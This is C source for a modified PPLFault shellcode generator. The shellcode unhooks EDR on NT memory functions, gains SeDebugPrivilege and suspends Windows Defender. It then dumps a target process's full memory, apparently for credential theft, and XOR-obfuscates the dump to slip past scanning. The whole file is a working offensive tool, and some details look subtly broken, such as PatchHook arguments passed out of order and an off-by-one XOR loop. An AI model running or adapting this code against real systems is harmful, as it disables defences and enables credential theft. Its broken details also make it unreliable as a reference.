// Modified PPLFault by Gabriel Landau
// https://twitter.com/GabrielLandau
#define _CRT_SECURE_NO_WARNINGS

#include <phnt_windows.h>
#include <phnt.h>
#include <DbgHelp.h>
#include <intrin.h>
#include <stdio.h>
#include <Windows.h>

#include "DumpShellcode.h"

#pragma optimize("", off)

PSHELLCODE_PARAMS GetParams();

VOID PatchHook(CHAR* address, CHAR* patch, HANDLE hProc, VirtualProtect_t pVirtualProtect, WriteProcessMemory_t pWriteProcessMemory, SIZE_T* szOld, PDWORD dwOld);

// Overwrites DllMain (technically CRT DllMain)
BOOL APIENTRY Shellcode(
    HMODULE hModule,
    DWORD  ul_reason_for_call,
    LPVOID lpReserved
)
{
    PSHELLCODE_PARAMS pParams = NULL;
    MiniDumpWriteDump_t pMiniDumpWriteDump = NULL;
    HANDLE hProcess = NULL;
    HANDLE hFile = NULL;
    HANDLE hDefender = NULL;
    HMODULE hDbgHelp = NULL;
    DWORD ignored = 0;
    DWORD bytesRead = 0;
    DWORD dumpSize = 0;
    LPVOID dumpBuffer = NULL;
    unsigned int i;
    DWORD dwOld = 0;
    SIZE_T szOld = 0;

    pParams = GetParams();
    HANDLE currProc = pParams->pGetCurrentProcess();

    // Unhook EDR

    PatchHook(pParams->pNtProtectVirtualMemory, currProc, pParams->patchNtProtectVirtualMemory, pParams->pVirtualProtect, pParams->pWriteProcessMemory, &szOld,  &dwOld);
    PatchHook(pParams->pNtReadVirtualMemory, currProc, pParams->patchNtReadVirtualMemory, pParams->pVirtualProtect, pParams->pWriteProcessMemory, &szOld, &dwOld);

    // Resolve remaining import
    hDbgHelp = pParams->pLoadLibraryW(pParams->szDbgHelpDll);
    if (NULL == hDbgHelp)
    {
        __debugbreak();
    }

    pMiniDumpWriteDump = (MiniDumpWriteDump_t)pParams->pGetProcAddress(hDbgHelp, pParams->szMiniDumpWriteDump);
    if (NULL == pMiniDumpWriteDump)
    {
        __debugbreak();
    }

    // Enable SeDebugPrivilege
    if (0 != pParams->pRtlAdjustPrivilege(SE_DEBUG_PRIVILEGE, TRUE, FALSE, &ignored))
    {
        __debugbreak();
    }

    // Acquire handle to Defender

    hDefender = pParams->pOpenProcess(PROCESS_SUSPEND_RESUME, FALSE, pParams->dwDefenderPID);

    if (NULL == hDefender) {
        __debugbreak();
    }

    // Suspend defender

    if (!NT_SUCCESS(pParams->pNtSuspendProcess(hDefender))) {
        __debugbreak();
    }

    pParams->pCloseHandle(hDefender);

    // Acquire handle to target
    hProcess = pParams->pOpenProcess(MAXIMUM_ALLOWED, FALSE, pParams->dwTargetProcessId);
    if (NULL == hProcess)
    {
        __debugbreak();
    }

    // Create output file
    hFile = pParams->pCreateFileW(pParams->dumpPath, FILE_ALL_ACCESS, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (INVALID_HANDLE_VALUE == hFile)
    {
        __debugbreak();
    }

    // Capture dump
    if (!pMiniDumpWriteDump(hProcess, 0, hFile, MiniDumpWithFullMemory, NULL, NULL, NULL))
    {
        __debugbreak();
    }

    // Close file

    pParams->pCloseHandle(hFile);

    // Open file again for read write

    hFile = pParams->pCreateFileW(pParams->dumpPath, FILE_ALL_ACCESS, 0, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (INVALID_HANDLE_VALUE == hFile)
    {
        __debugbreak();
    }

    // Allocate memory for buffer to read file

    dumpBuffer = pParams->pHeapAlloc(pParams->pGetProcessHeap(), HEAP_ZERO_MEMORY, 1024 * 1024 * 75);
    if (dumpBuffer == NULL)
    {
        __debugbreak();

    }

    // Read file

    if (!pParams->pReadFile(hFile, dumpBuffer, 1024 * 1024 * 75, &bytesRead, NULL)) {
        __debugbreak();
    }

    pParams->pCloseHandle(hFile);

    // Create new file

    hFile = pParams->pCreateFileW(pParams->dumpPath, FILE_ALL_ACCESS, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    
    // Encrypt dump

    for (i = 0; i <= bytesRead; i++)
    {
        *((BYTE*)dumpBuffer + i) = *((BYTE*)dumpBuffer + i) ^ 0x4B1D;
    }


    // Resume defender

    hDefender = pParams->pOpenProcess(PROCESS_SUSPEND_RESUME, FALSE, pParams->dwDefenderPID);

    if (NULL == hDefender) {
        __debugbreak();
    }

    if (!NT_SUCCESS(pParams->pNtResumeProcess(hDefender))) {
        __debugbreak();
    }

    pParams->pCloseHandle(hDefender);

    // Write to file

    if (!pParams->pWriteFile(hFile, dumpBuffer, bytesRead, &dumpSize, NULL)) {
        __debugbreak();
    }

    pParams->pCloseHandle(hFile);

    // Free heap memory

    if (!pParams->pHeapFree(pParams->pGetProcessHeap(), 0, dumpBuffer)) {
        __debugbreak();
    }

    dumpBuffer = NULL;

    // Don't trigger WER
    (void)pParams->pTerminateProcess((HANDLE)-1, 0);

    return TRUE;
}

PVOID WhereAmI()
{
    return _ReturnAddress();
}

PSHELLCODE_PARAMS GetParams()
{
    PUCHAR pSearch = (PUCHAR)WhereAmI();

    for (;; pSearch++)
    {
        PSHELLCODE_PARAMS pCandidate = (PSHELLCODE_PARAMS)pSearch;

        if ((MAGIC1 == pCandidate->magic1) && (MAGIC2 == pCandidate->magic2))
        {
            return pCandidate;
        }
    }

    return NULL;
}

VOID PatchHook(CHAR* address, CHAR* patch, HANDLE hProc, VirtualProtect_t pVirtualProtect, WriteProcessMemory_t pWriteProcessMemory, SIZE_T* szOld, PDWORD dwOld) {

    SIZE_T dwSize = 11;
    CHAR* patch_address = address;
    pVirtualProtect(patch_address, dwSize, PAGE_EXECUTE_READWRITE, dwOld);
    pWriteProcessMemory(hProc, patch_address, patch, dwSize, szOld);

}

BOOL EndShellcode()
{
    return TRUE;
}

#include <PathCch.h>

int main()
{
    WCHAR myPath[MAX_PATH] = { 0, };
    HMODULE hMe = GetModuleHandle(NULL);
    PUCHAR shellcodeStart = (PUCHAR)GetProcAddress(hMe, "Shellcode");
    PUCHAR shellcodeEnd = (PUCHAR)GetProcAddress(hMe, "EndShellcode");
    const SIZE_T shellcodeLength = (DWORD)(ULONG_PTR)(shellcodeEnd - shellcodeStart);
    HMODULE hFile = NULL;
    DWORD bytesWritten = 0;

    GetModuleFileNameW(NULL, myPath, ARRAYSIZE(myPath));
    wcsncat(myPath, L".shellcode", ARRAYSIZE(myPath) - wcslen(myPath));

    hFile = CreateFileW(myPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (INVALID_HANDLE_VALUE == hFile)
    {
        printf(" [!] Failed to open output file: %ws\n", myPath);
        return 1;
    }
    if (!WriteFile(hFile, shellcodeStart, (DWORD)shellcodeLength, &bytesWritten, NULL) ||
        (bytesWritten != shellcodeLength))
    {
        printf(" [!] Failed to write shellcode with GLE %u\n", GetLastError());
        return 1;
    }

    printf(" [+] Shellcode written to output file: %ws\n", myPath);

    return 0;
}
